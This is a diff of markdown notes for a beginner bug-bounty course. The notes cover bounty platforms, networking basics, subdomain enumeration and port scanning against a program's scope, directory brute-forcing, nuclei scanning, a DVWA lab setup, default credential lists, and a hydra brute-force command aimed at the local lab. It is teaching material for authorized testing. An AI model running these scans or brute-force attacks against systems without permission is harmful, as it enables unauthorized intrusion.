@@ -1,9 +1,11 @@
 # Ultimate Bug Bounty Course for Beginners
 
 ## Course Overview
+
 This course is designed for complete beginners who want to learn bug bounty hunting from scratch or strengthen their web hacking skills. The course takes you from zero to hero in bug bounty.
 
 ### Prerequisites
+
 - **Computer Requirements**: Minimum 4GB RAM (8GB recommended)
 - **Operating System**: Kali Linux
 - **Skills Required**: None! No programming languages, web hacking experience, or prior knowledge needed
@@ -13,9 +15,11 @@ This course is designed for complete beginners who want to learn bug bounty hunt
 ## Module 1: Introduction to Bug Bounty
 
 ### What is Bug Bounty?
+
 Bug bounty is a reward paid to people who find mistakes and bugs in websites, apps, and software - especially vulnerabilities that could be exploited by hackers.
 
 **Key Points:**
+
 - Companies want to find and fix bugs before malicious actors discover them
 - They offer money to ethical hackers (white hat hackers) who help identify vulnerabilities
 - It's like being a digital detective
@@ -29,16 +33,19 @@ Bug bounty is a reward paid to people who find mistakes and bugs in websites, ap
 ## Module 2: Bug Bounty Platforms
 
 ### What are Bug Bounty Platforms?
+
 Platforms where companies run initiatives inviting ethical hackers (security researchers) to find and report bugs in their systems.
 
 ### Types of Programs
 
 #### 1. **Public Bug Bounty Programs (BBP)**
+
 - Open to everyone globally
 - Anyone can participate and hunt for bugs
 - Examples: Tinder, NBA, Nice#sh
 
 #### 2. **Vulnerability Disclosure Programs (VDP)**
+
 - Focus on responsible vulnerability disclosure
 - May not offer monetary rewards
 - Usually provides recognition/Hall of Fame
@@ -46,6 +53,7 @@ Platforms where companies run initiatives inviting ethical hackers (security res
 - For companies without budget for rewards
 
 #### 3. **Private Programs**
+
 - Invitation-only programs
 - Exclusive access for top-ranked hackers (typically top 100)
 - Less competition
@@ -54,12 +62,14 @@ Platforms where companies run initiatives inviting ethical hackers (security res
 ### Major Bug Bounty Platforms
 
 #### HackerOne
+
 - Leading global platform
 - Protects major companies: Salesforce, Zoom, Uber, IBM
 - **Platform URL**: HackerOne.com
 - **Account Type**: Create as "I am a hacker"
 
 **Key Features:**
+
 - Public and private programs
 - VDP programs
 - CTF challenges for practice
@@ -69,12 +79,14 @@ Platforms where companies run initiatives inviting ethical hackers (security res
   - Bounty ranges
 
 #### Bugcrowd
+
 - Another major platform
 - Lists both own programs and other platforms' programs
 - Many enterprise clients
 - Filter options by rewards, scope, targets
 
 #### Intigriti
+
 - European-focused platform
 - Most companies are Euro-based
 - Rewards typically in Euros
@@ -87,17 +99,20 @@ Platforms where companies run initiatives inviting ethical hackers (security res
 ### Important Factors to Consider
 
 #### 1. **Program Age**
+
 - Older programs (4+ years) likely have been heavily tested
 - Newer programs have higher probability of finding bugs
 - Check launch date on program page
 
 #### 2. **Reward Information**
+
 - **Average Bounty**: Typical payout amount
 - **Top Bounty Range**: Maximum possible reward
 - **Total Paid**: Historical payouts (indicates program activity)
 - **Recent Activity**: Reports received in last 90 days
 
 #### 3. **Response Metrics**
+
 - **Average Response Time**: How quickly team responds
 - **Triage Time**: Time taken to start fixing issues
 - Important for knowing program responsiveness
@@ -105,6 +120,7 @@ Platforms where companies run initiatives inviting ethical hackers (security res
 #### 4. **Reward Structure by Severity**
 
 **Example (Rockstar Games):**
+
 - **Minimum Bounty**: $150
 - **Low**: $150 - $500 (Open Redirect, CSRF, Low Impact Access)
 - **Medium**: $500 - $1,000 (Reflected XSS, DOM XSS)
@@ -114,17 +130,20 @@ Platforms where companies run initiatives inviting ethical hackers (security res
 #### 5. **Scope Analysis** (MOST IMPORTANT)
 
 **In-Scope:**
+
 - Assets you CAN legally test
 - Look for wildcard domains: `*.rockstargames.com`
 - Wildcard (`*`) means ALL subdomains are valid targets
 - Larger scope = More opportunities to find bugs
 
 **Out-of-Scope:**
+
 - Assets you CANNOT test
 - Testing these = No bounty + Possible legal issues
 - Always check excluded domains/subdomains
 
 **Example Wildcard Benefits:**
+
 ```
 rockstargames.com with wildcard (*) includes:
 - store.rockstargames.com ✓
@@ -136,6 +155,7 @@ rockstargames.com with wildcard (*) includes:
 #### 6. **What's NOT Accepted**
 
 Common exclusions:
+
 - Physical access attacks
 - Social engineering
 - Denial of Service (DoS) attacks
@@ -145,6 +165,7 @@ Common exclusions:
 - Bugs that affect user privacy/security/experience negatively
 
 #### 7. **Non-Disclosure Agreement (NDA)**
+
 - Cannot discuss vulnerabilities publicly before/after submission
 - Must get permission before sharing online
 - Can only share after fix + company approval
@@ -156,11 +177,13 @@ Common exclusions:
 ### Client-Server Model
 
 **Components:**
+
 - **Client**: Device making the request (phone, PC, laptop)
 - **Server**: System responding to requests
 - **Network/Internet**: Medium connecting them
 
 **How it Works:**
+
 1. Client sends request for information
 2. Request travels through internet
 3. Server receives request
@@ -168,6 +191,7 @@ Common exclusions:
 5. Client receives and displays data
 
 **Example:**
+
 - You open YouTube on phone → Client (your phone) requests video
 - Request goes to YouTube servers through internet
 - YouTube server sends video data back
@@ -180,12 +204,14 @@ Common exclusions:
 ### DNS (Domain Name System)
 
 #### What is DNS?
+
 - **Full Form**: Domain Name System
 - **Protocol Used**: UDP (User Datagram Protocol)
 - **Port Number**: 53
 - **Purpose**: Translates domain names ↔ IP addresses
 
 **Why DNS Exists:**
+
 - Humans can't remember IP addresses (e.g., 142.251.87.238)
 - Domain names are human-readable (e.g., google.com)
 - DNS acts as a "dictionary" mapping names to IPs
@@ -193,6 +219,7 @@ Common exclusions:
 #### Types of DNS Servers
 
 ##### 1. Root Server
+
 - Top-level server containing the entire DNS tree
 - Doesn't contain domain information itself
 - Delegates authority to other servers
@@ -200,12 +227,14 @@ Common exclusions:
 - Example: Google Maps showing location of stores, but not what's inside
 
 ##### 2. Primary Server (Authoritative)
+
 - Stores complete zone file for domains
 - Has authority to create, maintain, and update zone files
 - Contains actual DNS data for specific domains
 - Like the actual dictionary with word definitions
 
 ##### 3. Secondary Server
+
 - Backup server copying data from primary
 - Cannot create or update zone files
 - Used only for redundancy
@@ -226,11 +255,13 @@ Common exclusions:
 7. **Response chain**: IP → ISP → Your browser → Website loads
 
 **Visual Flow:**
+
 ```
 Browser → ISP DNS → Root DNS → .com TLD DNS → Authoritative DNS → IP Address → Browser
 ```
 
 #### Top-Level Domains (TLDs)
+
 - `.com` - Commercial (most common)
 - `.gov` - Government organizations
 - `.edu` - Educational institutions
@@ -243,22 +274,26 @@ Browser → ISP DNS → Root DNS → .com TLD DNS → Authoritative DNS → IP A
 ### IP Addresses
 
 #### What is an IP Address?
+
 - **Full Form**: Internet Protocol Address
 - **Purpose**: Unique identifier for devices on a network
 - **Function**: Like a phone number or home address for your device
 
 **Characteristics:**
+
 - Every device on internet has unique IP
 - Helps devices identify and communicate with each other
 - Used for routing information (web pages, emails, videos)
 - Not human-friendly (hence DNS was invented)
 
 **Example Format:**
+
 ```
 IPv4: 142.251.87.238
 ```
 
 **Real-World Analogy:**
+
 - IP Address = Your home address
 - Just as mail needs home address to reach you
 - Data needs IP address to reach correct device
@@ -268,11 +303,13 @@ IPv4: 142.251.87.238
 ### Ports
 
 #### What are Ports?
+
 - **Definition**: Numerical identifiers directing network traffic to correct services
 - **Range**: 0-65535
 - **Purpose**: Allow multiple services on one IP address
 
 **House Analogy:**
+
 - **IP Address** = Your house address
 - **Ports** = Different doors/rooms in the house
   - Kitchen door = For food-related items
@@ -280,6 +317,7 @@ IPv4: 142.251.87.238
   - Bathroom door = For hygiene items
 
 **How Ports Work:**
+
 ```
 IP Address: 192.168.1.1 (The house)
 Port 80: HTTP web traffic (Kitchen door)
@@ -288,6 +326,7 @@ Port 53: DNS queries (Bathroom door)
 ```
 
 **Common Ports:**
+
 - Port 80: HTTP
 - Port 443: HTTPS
 - Port 53: DNS
@@ -301,6 +340,7 @@ Port 53: DNS queries (Bathroom door)
 #### HTTP (HyperText Transfer Protocol)
 
 **Characteristics:**
+
 - Protocol for browser-server communication
 - **Stateless by default**: Doesn't remember previous requests
 - Each request is independent
@@ -308,6 +348,7 @@ Port 53: DNS queries (Bathroom door)
 - No encryption - data sent in plain text
 
 **Stateless Example:**
+
 ```
 Request 1: User logs in → Server responds
 Request 2: User views page → Server doesn't remember login
@@ -317,6 +358,7 @@ Request 2: User views page → Server doesn't remember login
 #### HTTPS (HTTP Secure)
 
 **Features:**
+
 - HTTP + Encryption (SSL/TLS)
 - Protects data from being intercepted
 - Shows green padlock in browser
@@ -326,12 +368,14 @@ Request 2: User views page → Server doesn't remember login
   - Sensitive data transfer
 
 **Encryption Benefit:**
+
 ```
 Without HTTPS: "password123" → Anyone can read
 With HTTPS: "p@$$w0rd123" → "xK9mP2qL..." (encrypted, unreadable)
 ```
 
 **Analogy:**
+
 - HTTP: Sending a postcard (anyone can read)
 - HTTPS: Sending a sealed, locked envelope (only recipient can open)
 
@@ -340,6 +384,7 @@ With HTTPS: "p@$$w0rd123" → "xK9mP2qL..." (encrypted, unreadable)
 ## Important Notes & Best Practices
 
 ### Program Selection Tips
+
 1. Choose programs with wildcard domains for larger scope
 2. Target industries you're familiar with (gaming, healthcare, etc.)
 3. Check competition level (reports in last 90 days)
@@ -347,6 +392,7 @@ With HTTPS: "p@$$w0rd123" → "xK9mP2qL..." (encrypted, unreadable)
 5. Read entire scope and rules carefully
 
 ### Legal Considerations
+
 - **ALWAYS** stay within scope
 - Get explicit permission before testing
 - Follow responsible disclosure
@@ -355,6 +401,7 @@ With HTTPS: "p@$$w0rd123" → "xK9mP2qL..." (encrypted, unreadable)
 - Don't perform DoS attacks
 
 ### What Makes a Good Target
+
 ✓ Wildcard domain (`*.example.com`)
 ✓ Recently launched program
 ✓ Reasonable bounty range
@@ -365,7 +412,9 @@ With HTTPS: "p@$$w0rd123" → "xK9mP2qL..." (encrypted, unreadable)
 ---
 
 ## Activity Section of Programs
+
 View disclosed reports from other researchers:
+
 - Learn from real vulnerability examples
 - See proper report formatting
 - Understand what companies accept
@@ -374,7 +423,9 @@ View disclosed reports from other researchers:
 ---
 
 ## Next Steps
+
 This covers the first half of the course. Coming up:
+
 - Advanced reconnaissance techniques
 - Vulnerability types deep-dive
 - Practical hunting methodology
@@ -392,11 +443,13 @@ This covers the first half of the course. Coming up:
 HTTP methods define how browsers communicate with servers. There are four main types:
 
 #### 1. **GET Request**
+
 - **Purpose**: Retrieve information from server
 - **Use Case**: Loading web pages, fetching videos, viewing content
 - **Example**: When you visit YouTube, your browser sends GET request for video data
 
 #### 2. **POST Request**
+
 - **Purpose**: Submit data to server and create new records
 - **Use Cases**:
   - Login (sending username/password)
@@ -405,6 +458,7 @@ HTTP methods define how browsers communicate with servers. There are four main t
 - **Analogy**: Like mailing a letter through postal service
 
 #### 3. **PUT Request**
+
 - **Purpose**: Submit data to update existing information
 - **Use Cases**:
   - Updating profile bio
@@ -412,10 +466,12 @@ HTTP methods define how browsers communicate with servers. There are four main t
 - **Difference from POST**: POST creates new, PUT updates existing
 
 #### 4. **DELETE Request**
+
 - **Purpose**: Delete information/records from server
 - **Use Case**: Deleting Instagram photos, removing content
 
 **Quick Summary:**
+
 - GET = Retrieve data from server
 - POST = Send new data to server
 - PUT = Update existing data on server
@@ -428,30 +484,36 @@ HTTP methods define how browsers communicate with servers. There are four main t
 Status codes tell us the state of our HTTP requests:
 
 ### 1xx - Informational Codes (100-199)
+
 - **Meaning**: Server acknowledges and is processing the request
 - Request is in progress
 
 ### 2xx - Success Codes (200-299)
+
 - **Meaning**: Server successfully received, understood, and processed request
 - **200 OK**: Most common success code
 - Everything worked as expected
 
 ### 3xx - Redirection Codes (300-399)
+
 - **Meaning**: Server received request but redirecting to another location
 - **Example**: fb.com → facebook.com
 - Resource has moved or multiple options available
 
 ### 4xx - Client Error Codes (400-499)
+
 - **Meaning**: Error on client side (your side)
 - **404 Not Found**: Most common - requested page doesn't exist on server
 - Server doesn't have the data you're requesting
 
 ### 5xx - Server Error Codes (500-599)
+
 - **Meaning**: Client made valid request but server failed to complete it
 - **500 Internal Server Error**: Server has issues
 - Request was correct, but server cannot process it
 
 **Browser Developer Tools Demo:**
+
 ```
 Press F12 or Right-click → Inspect
 Go to Network tab
@@ -468,12 +530,14 @@ See all requests with status codes:
 ### The Stateless Problem of HTTP
 
 **HTTP's Main Issues:**
+
 1. ❌ Not encrypted (Fixed by HTTPS)
 2. ❌ Stateless (doesn't remember previous requests)
 
 ### Why Cookies Were Invented
 
 **The Problem:**
+
 ```
 User logs into Facebook → HTTP Request 1
 User posts comment → HTTP Request 2
@@ -484,12 +548,14 @@ Result: You'd need to login again for every action!
 ### How Cookies Solve This
 
 **Cookie Workflow:**
+
 1. **Login**: User sends username/password to server
 2. **Server Response**: Server sends back a cookie (stored in browser)
 3. **Next Request**: Browser automatically sends cookie with each request
 4. **Server Recognition**: Server reads cookie, recognizes user, allows action
 
 **Key Points:**
+
 - Cookies = Small data files stored in browser
 - Used to identify users across requests
 - Solve HTTP's stateless nature
@@ -507,6 +573,7 @@ Think of cookies like a membership card. Show it once, and the store remembers y
 **Definition:** The initial phase of penetration testing where hackers gather maximum information about target systems and networks.
 
 **Purpose:**
+
 - Understand system architecture
 - Identify vulnerabilities
 - Find potential entry points
@@ -514,17 +581,20 @@ Think of cookies like a membership card. Show it once, and the store remembers y
 
 **Military Analogy:**
 Just like the army conducts reconnaissance before a surgical strike:
+
 1. Confirm target location
 2. Study blueprints/layout
 3. Plan infiltration strategy
 4. Execute operation
 
 **In Bug Bounty:**
+
 - More reconnaissance = More chances of finding bugs
 - Weak recon = Likely no bugs found
 - Reconnaissance comes BEFORE exploitation
 
 **Golden Rule:**
+
 > "The quality of your reconnaissance directly determines your success in bug hunting."
 
 ---
@@ -536,6 +606,7 @@ Just like the army conducts reconnaissance before a surgical strike:
 **Definition:** Parts of a larger domain that organize different sections of a website.
 
 **Structure:**
+
 ```
 Main Domain: example.com
 
@@ -547,6 +618,7 @@ Subdomains:
 ```
 
 **Real Examples:**
+
 - Google Mail: mail.google.com
 - Google Drive: drive.google.com
 - Google Maps: maps.google.com
@@ -554,12 +626,14 @@ Subdomains:
 ### Why Subdomains Matter in Bug Bounty
 
 **Key Advantages:**
+
 1. Each subdomain = Different application
 2. Wildcard domains (`*.example.com`) = Massive scope
 3. More subdomains = More opportunities for bugs
 4. Less tested subdomains = Higher bug probability
 
 **Company Office Analogy:**
+
 - Main domain = Office building
 - Subdomains = Different departments (HR, IT, Accounts)
 - Each department has different security levels
@@ -570,13 +644,15 @@ Subdomains:
 ## Module 10: Subdomain Enumeration Tools
 
 ### Target Selection: Rockstar Games
+
 - Main domain: rockstargames.com
-- Wildcard scope: *.rockstargames.com
+- Wildcard scope: \*.rockstargames.com
 - High functionality website (games, store, accounts)
 
 ### Tool 1: Subfinder
 
 **Installation:**
+
 ```bash
 # Method 1: APT (may be outdated)
 sudo apt install subfinder
@@ -591,6 +667,7 @@ sudo apt install subfinder
 ```
 
 **Usage:**
+
 ```bash
 # Basic scan
 subfinder -d rockstargames.com -all
@@ -600,6 +677,7 @@ subfinder -d rockstargames.com -all -o subdomains.txt
 ```
 
 **How It Works:**
+
 - Searches public sources (Google, search engines)
 - Finds indexed subdomains
 - Fast and comprehensive
@@ -613,35 +691,43 @@ subfinder -d rockstargames.com -all -o subdomains.txt
 Similar to Subfinder (Project Discovery tool)
 
 **Usage:**
+
 ```bash
 amass enum -d rockstargames.com
 ```
 
 **What It Provides:**
+
 - DNS records (NS, MX records)
 - Name server information
 - Mail server records
 - Additional subdomain data
 
 **Filtering Output:**
+
 ```bash
 # Extract only subdomains from output
 grep pattern amass.txt > amass_final.txt
+creat a file name amass.txt then paste the output of amass
+grep -E '\b([a-zA-Z0-9_-]+\.)+nationitltd\.com\b' amass.txt > amass_final.txt
 ```
 
 ### Tool 3: DNSx (DNS Bruteforcing)
 
 **Key Difference:**
+
 - Subfinder/Amass = Find publicly indexed subdomains
 - DNSx = Bruteforce hidden subdomains
 
 **Why DNSx is Important:**
+
 - Finds subdomains NOT indexed by Google
 - Discovers hidden/internal subdomains
 - Uses wordlist-based bruteforcing
 - Companies don't want these found (perfect for bug bounty!)
 
 **Installation:**
+
 ```bash
 # Download from GitHub
 # Install seclists wordlist
@@ -652,6 +738,7 @@ dnsx -d rockstargames.com -w /usr/share/wordlists/amass/subdomains-top20000.txt
 ```
 
 **Wordlist Location:**
+
 ```
 /usr/share/wordlists/amass/
 - subdomains-top1million.txt
@@ -676,11 +763,13 @@ cd rockstargames
 ### Combining Results
 
 **Files Created:**
+
 1. `subfinder.txt` - Subfinder results
 2. `amass_final.txt` - Amass filtered results
 3. `dnsx.txt` - DNSx bruteforce results
 
 **Merge & Deduplicate:**
+
 ```bash
 cat subfinder.txt amass_final.txt dnsx.txt | sort -u > final_subdomains.txt
 ```
@@ -692,7 +781,9 @@ cat subfinder.txt amass_final.txt dnsx.txt | sort -u > final_subdomains.txt
 ## Module 12: Filtering Live Subdomains with HTTPx
 
 ### The Problem
+
 Not all discovered subdomains are active or usable. Need to filter:
+
 - ✓ Live websites
 - ✓ Accessible applications
 - ✗ Dead/inactive subdomains
@@ -700,6 +791,7 @@ Not all discovered subdomains are active or usable. Need to filter:
 ### Tool: HTTPx
 
 **Installation:**
+
 ```bash
 # GitHub download
 # Extract and move to /usr/local/bin/
@@ -707,6 +799,7 @@ httpx -version
 ```
 
 **Usage:**
+
 ```bash
 cat final_subdomains.txt | httpx \
   -o targets.txt \
@@ -717,6 +810,7 @@ cat final_subdomains.txt | httpx \
 ```
 
 **Flags Explained:**
+
 - `-status-code`: Shows HTTP status (200, 404, 500, etc.)
 - `-location`: Shows redirect locations
 - `-title`: Webpage title
@@ -727,6 +821,7 @@ cat final_subdomains.txt | httpx \
 **Status Code Analysis:**
 
 **200 OK (Success):**
+
 ```
 store.rockstargames.com [200] [E-commerce Store]
 ✓ Live website
@@ -735,6 +830,7 @@ store.rockstargames.com [200] [E-commerce Store]
 ```
 
 **404 Not Found:**
+
 ```
 videos.rockstargames.com [404] [Not Found]
 ✗ No content
@@ -742,6 +838,7 @@ videos.rockstargames.com [404] [Not Found]
 ```
 
 **301/302 (Redirect):**
+
 ```
 fb.com → facebook.com [302]
 ✓ Check redirect destination
@@ -766,6 +863,7 @@ fb.com → facebook.com [302]
 ### Selected Target Example
 
 **store.rockstargames.com**
+
 - Status: 200 OK
 - Type: E-commerce platform
 - Features: Login, Buy, Search, Cart
@@ -773,6 +871,7 @@ fb.com → facebook.com [302]
 - **Decision**: Primary target for bug hunting
 
 **Secondary Target:**
+
 ```
 bombgar.rockstargames.com
 - Remote support portal
@@ -790,6 +889,7 @@ bombgar.rockstargames.com
 **Definition:** Numerical identifiers that direct network traffic to correct services on a device.
 
 **House Analogy (Recap):**
+
 ```
 IP Address = Your house address
 Ports = Different doors in the house
@@ -800,6 +900,7 @@ Ports = Different doors in the house
 ```
 
 **Key Concept:**
+
 - Each port = Specific service
 - Port numbers: 0-65535
 - Different data types use different ports
@@ -809,13 +910,13 @@ Ports = Different doors in the house
 
 ## Tools Used Summary
 
-| Tool | Purpose | Created By |
-|------|---------|------------|
-| Subfinder | Find public subdomains | Project Discovery |
-| Amass | DNS enumeration + records | Project Discovery |
-| DNSx | Bruteforce hidden subdomains | Project Discovery |
-| HTTPx | Probe live hosts + tech detection | Project Discovery |
-| Wappalyzer | Technology detection (browser) | Extension |
+| Tool       | Purpose                           | Created By        |
+| ---------- | --------------------------------- | ----------------- |
+| Subfinder  | Find public subdomains            | Project Discovery |
+| Amass      | DNS enumeration + records         | Project Discovery |
+| DNSx       | Bruteforce hidden subdomains      | Project Discovery |
+| HTTPx      | Probe live hosts + tech detection | Project Discovery |
+| Wappalyzer | Technology detection (browser)    | Extension         |
 
 ---
 
@@ -842,6 +943,7 @@ graph TD
 ## Best Practices for Subdomain Enumeration
 
 ### Do's:
+
 ✓ Always use multiple tools (different results)
 ✓ Save all outputs separately
 ✓ Combine and deduplicate results
@@ -850,6 +952,7 @@ graph TD
 ✓ Look for hidden/internal subdomains
 
 ### Don't's:
+
 ✗ Rely on single tool
 ✗ Skip deduplication step
 ✗ Test all subdomains blindly
@@ -862,19 +965,23 @@ graph TD
 ## Important Notes
 
 ### Tool Updates
+
 - Always use latest versions from GitHub
 - GitHub URL + `/releases` for direct downloads
 - Old versions may miss results or have bugs
 - Update command: Check installation section for each tool
 
 ### Project Discovery Tools
+
 All major tools come from Project Discovery:
+
 - Consistent interface
 - Well-maintained
 - Active community
 - Regular updates
 
 ### File Organization
+
 ```
 rockstargames/
 ├── subfinder.txt
@@ -900,6 +1007,7 @@ rockstargames/
 ## What's Coming Next
 
 Part 3 will cover:
+
 - Port scanning techniques
 - Directory bruteforcing
 - Technology analysis
@@ -914,15 +1022,15 @@ Part 3 will cover:
 
 ### Common Ports and Services
 
-| Port | Protocol | Service | Purpose |
-|------|----------|---------|---------|
-| 20 | TCP | FTP Data Transfer | File transfer in FTP sessions |
-| 21 | TCP | FTP Command/Control | Commands in FTP sessions |
-| 22 | TCP | SSH | Remote server access |
-| 25 | TCP | SMTP | Email sending (Gmail) |
-| 53 | UDP | DNS | Resolving domain names to IPs |
-| 80 | TCP | HTTP | Web page transmission |
-| 443 | TCP | HTTPS | Secure web traffic (SSL/TLS) |
+| Port | Protocol | Service             | Purpose                       |
+| ---- | -------- | ------------------- | ----------------------------- |
+| 20   | TCP      | FTP Data Transfer   | File transfer in FTP sessions |
+| 21   | TCP      | FTP Command/Control | Commands in FTP sessions      |
+| 22   | TCP      | SSH                 | Remote server access          |
+| 25   | TCP      | SMTP                | Email sending (Gmail)         |
+| 53   | UDP      | DNS                 | Resolving domain names to IPs |
+| 80   | TCP      | HTTP                | Web page transmission         |
+| 443  | TCP      | HTTPS               | Secure web traffic (SSL/TLS)  |
 
 ### Port Scanning Tools
 
@@ -931,15 +1039,18 @@ Part 3 will cover:
 **Description:** Swiss Army knife of scanning tools - versatile and comprehensive.
 
 **Basic Scan:**
+
 ```bash
 sudo nmap -sS -sV store.rockstargames.com
 ```
 
 **Flags Explained:**
+
 - `-sS`: SYN scan (stealth scan)
 - `-sV`: Version detection
 
 **Results:**
+
 ```
 PORT    STATE   SERVICE    VERSION
 80/tcp  open    http       Amazon CloudFront httpd
@@ -947,6 +1058,7 @@ PORT    STATE   SERVICE    VERSION
 ```
 
 **Analysis:**
+
 - Only 2 ports open
 - Both web-related (HTTP/HTTPS)
 - Running Amazon CloudFront
@@ -955,16 +1067,19 @@ PORT    STATE   SERVICE    VERSION
 #### Tool 2: Naabu (Fast Port Scanner)
 
 **Installation:**
+
 ```bash
 sudo apt install naabu
 ```
 
 **Usage:**
+
 ```bash
 naabu -host store.rockstargames.com
 ```
 
 **Advantages:**
+
 - Faster than Nmap
 - Good for quick scans
 - Multiple domains simultaneously
@@ -981,6 +1096,7 @@ naabu -host store.rockstargames.com
 **Definition:** A folder on a web server containing files and other folders, similar to your computer's folder structure.
 
 **Example Structure:**
+
 ```
 website.com/
 ├── images/
@@ -997,6 +1113,7 @@ website.com/
 **Technique:** Try to find hidden and unlisted directories/files by guessing common folder/file names.
 
 **Why It's Important:**
+
 - Find hidden admin panels
 - Discover backup files
 - Locate API endpoints
@@ -1004,17 +1121,20 @@ website.com/
 - Access sensitive information
 
 **Building Analogy:**
+
 - Visible doors = Linked pages (Login, Contact, Games)
 - Hidden doors = Unlinked directories (trying different names to find them)
 
 ### Tool: Feroxbuster
 
 **Installation:**
+
 ```bash
 sudo apt install feroxbuster
 ```
 
 **Basic Usage:**
+
 ```bash
 feroxbuster -u https://store.rockstargames.com \
   -w /usr/share/wordlists/dirb/common.txt \
@@ -1023,6 +1143,7 @@ feroxbuster -u https://store.rockstargames.com \
 ```
 
 **Flags Explained:**
+
 - `-u`: Target URL
 - `-w`: Wordlist path
 - `-t 100`: Threads (speed - be careful!)
@@ -1030,10 +1151,12 @@ feroxbuster -u https://store.rockstargames.com \
 
 **Important Notes:**
 ⚠️ **Thread Warning:** High threads = Many requests = May trigger WAF/blocking
+
 - Default threads recommended
 - High threads for testing only
 
 **Results Found:**
+
 - `/search` - Search functionality
 - JavaScript files (analyze for endpoints)
 - `/merchandise` - Product pages
@@ -1042,6 +1165,7 @@ feroxbuster -u https://store.rockstargames.com \
 
 **Recursive Scanning:**
 Feroxbuster automatically scans discovered directories deeper:
+
 ```
 /static/ → /static/chunks/ → /static/chunks/[files]
 ```
@@ -1049,6 +1173,7 @@ Feroxbuster automatically scans discovered directories deeper:
 ### Additional Tools
 
 #### Wafw00f (Firewall Detection)
+
 ```bash
 wafw00f https://store.rockstargames.com
 ```
@@ -1066,6 +1191,7 @@ wafw00f https://store.rockstargames.com
 **Description:** Modern high-performance vulnerability scanner using YAML-based templates.
 
 **Key Features:**
+
 - Template-based scanning
 - Built-in templates (thousands)
 - Custom template creation
@@ -1089,11 +1215,13 @@ nuclei -ut
 ### Usage
 
 **Single Target:**
+
 ```bash
 nuclei -target https://store.rockstargames.com
 ```
 
 **Multiple Targets (List):**
+
 ```bash
 nuclei -l targets.txt
 ```
@@ -1101,11 +1229,13 @@ nuclei -l targets.txt
 ### Results Interpretation
 
 **Finding Categories:**
+
 - 🔴 Critical: SQL Injection, RCE
 - 🟡 Medium: XSS, CSRF
 - 🔵 Info: Security headers, SSL config
 
 **Example Results:**
+
 ```
 [INFO] Weak cipher suites
 [INFO] CloudFront detected
@@ -1124,6 +1254,7 @@ nuclei -l targets.txt
 **Description:** Fast web crawler that extracts all links, JavaScript files, and hidden endpoints.
 
 **Installation:**
+
 ```bash
 # Same as other Project Discovery tools
 sudo mv katana /usr/local/bin/
@@ -1139,6 +1270,7 @@ katana -u https://store.rockstargames.com \
 ```
 
 **Flags:**
+
 - `-jc`: JavaScript crawler
 - `-u`: Target URL
 - `-o`: Output file
@@ -1147,6 +1279,7 @@ katana -u https://store.rockstargames.com \
 ### Results
 
 **Discovers:**
+
 - Internal links
 - External references
 - JavaScript files (.js)
@@ -1157,6 +1290,7 @@ katana -u https://store.rockstargames.com \
 
 **JavaScript Files Analysis:**
 Sometimes contain:
+
 - API keys (accidental exposure)
 - Hidden endpoints
 - Internal function names
@@ -1171,6 +1305,7 @@ Sometimes contain:
 **Full Name:** Damn Vulnerable Web Application
 
 **Purpose:**
+
 - Practice web vulnerabilities safely
 - Learn exploitation techniques
 - Test tools in controlled environment
@@ -1180,6 +1315,7 @@ Sometimes contain:
 ### Installation
 
 **Prerequisites:**
+
 ```bash
 # Install Docker
 sudo apt install docker
@@ -1190,6 +1326,7 @@ sudo systemctl enable docker
 ```
 
 **Download DVWA:**
+
 ```bash
 # Pull DVWA image
 sudo docker pull vulnerables/web-dvwa
@@ -1201,6 +1338,7 @@ sudo docker run -p 80:80 vulnerables/web-dvwa
 **Access:** http://localhost
 
 **Default Credentials:**
+
 - Username: admin
 - Password: password
 
@@ -1209,6 +1347,7 @@ sudo docker run -p 80:80 vulnerables/web-dvwa
 **Issue:** Some features disabled by default
 
 **Fix `allow_url_include`:**
+
 ```bash
 # Check running containers
 sudo docker ps
@@ -1257,6 +1396,7 @@ exit
    - Shows secure coding
 
 **Additional Feature:** PHPIDS (Web Application Firewall)
+
 - Can be enabled/disabled
 - Simulates real-world WAF
 
@@ -1269,6 +1409,7 @@ exit
 **Definition:** Trying every possible combination of keys to unlock a door.
 
 **Example:** 4-digit PIN
+
 ```
 Try: 0000, 0001, 0002... 1234 ✓
 Eventually finds correct combination
@@ -1285,6 +1426,7 @@ Eventually finds correct combination
 5. **Account Flagging:** Marks account as suspicious
 
 **Where It Works:**
+
 - Offline password cracking (always works, just takes time)
 - Online portals WITHOUT protection
 - Forgotten/abandoned subdomains
@@ -1295,6 +1437,7 @@ Eventually finds correct combination
 **Definition:** Trying factory-setting passwords that devices/services come with.
 
 **Common Defaults:**
+
 - admin / admin
 - admin / password
 - root / root
@@ -1302,12 +1445,14 @@ Eventually finds correct combination
 - administrator / administrator
 
 **Why They Work:**
+
 - Developers forget to change
 - System admins use defaults
 - Old/forgotten systems
 - Internal tools
 
 **First Step:** Always try common passwords before brute forcing:
+
 1. admin/admin
 2. admin/password
 3. admin/123456
@@ -1319,6 +1464,7 @@ Eventually finds correct combination
 Fast online password attack tool supporting 50+ protocols.
 
 **Supported Services:**
+
 - HTTP/HTTPS
 - FTP
 - SSH
@@ -1330,6 +1476,7 @@ Fast online password attack tool supporting 50+ protocols.
 #### Step 1: Intercept Request with Burp Suite
 
 **Setup Burp Suite:**
+
 ```
 1. Install FoxyProxy extension in browser
 2. Configure proxy:
@@ -1342,6 +1489,7 @@ Fast online password attack tool supporting 50+ protocols.
 ```
 
 **Intercept Login Request:**
+
 ```
 1. Try login with test credentials
 2. Burp captures request
@@ -1353,6 +1501,7 @@ Fast online password attack tool supporting 50+ protocols.
 ```
 
 **Example Intercepted Request:**
+
 ```
 GET /vulnerabilities/brute/?username=admin&password=1234&Login=Login
 Host: localhost
@@ -1362,17 +1511,20 @@ Cookie: PHPSESSID=...; security=medium
 #### Step 2: Build Hydra Command
 
 **Basic Structure:**
+
 ```bash
 hydra -l <username> -P <password_file> <target> <service> "<parameters>"
 ```
 
 **Flags:**
+
 - `-l` (lowercase): Single username
 - `-L` (uppercase): Username file
 - `-p` (lowercase): Single password
 - `-P` (uppercase): Password file
 
 **Full Command Example:**
+
 ```bash
 hydra -l admin \
   -P /usr/share/wordlists/rockyou.txt \
@@ -1382,6 +1534,7 @@ hydra -l admin \
 ```
 
 **Command Breakdown:**
+
 - `hydra`: Initialize tool
 - `-l admin`: Username is "admin"
 - `-P rockyou.txt`: Use rockyou password list
@@ -1395,10 +1548,12 @@ hydra -l admin \
 - `F=Username and/or...`: Failure message
 
 **Placeholders:**
+
 - `^USER^`: Hydra replaces with username
 - `^PASS^`: Hydra replaces with password from wordlist
 
 **Rockyou.txt Location:**
+
 ```bash
 /usr/share/wordlists/rockyou.txt
 
